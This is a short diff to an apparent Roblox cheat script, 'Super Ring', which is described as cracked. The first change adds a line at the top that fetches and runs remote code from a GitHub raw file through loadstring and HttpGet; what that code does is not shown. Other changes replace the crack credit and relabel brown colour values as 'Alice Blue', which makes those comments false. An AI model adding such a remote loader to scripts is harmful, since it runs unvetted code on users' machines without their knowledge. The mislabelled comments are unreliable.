@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PhantomAngelx/PHANTOM-ANGEL/refs/heads/main/Whitelist%20people"))()
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
@@ -117,8 +119,8 @@ RadiusCorner.Parent = RadiusDisplay
 local Watermark = Instance.new("TextLabel")
 Watermark.Size = UDim2.new(1, 0, 0, 20)
 Watermark.Position = UDim2.new(0, 0, 1, -20)
-Watermark.Text = "Super Ring [V3] - Cracked By Projeto LKB"
-Watermark.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
+Watermark.Text = "Time will always win"
+Watermark.TextColor3 = Color3.fromRGB(101, 67, 33) -- Alice Blue
 Watermark.BackgroundTransparency = 1
 Watermark.Font = Enum.Font.Fondamento
 Watermark.TextSize = 14
@@ -129,7 +131,7 @@ local MinimizeButton = Instance.new("TextButton")
 MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
 MinimizeButton.Position = UDim2.new(1, -35, 0, 5)
 MinimizeButton.Text = "-"
-MinimizeButton.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Alice Blue
 MinimizeButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
 MinimizeButton.Font = Enum.Font.Fondamento
 MinimizeButton.TextSize = 18
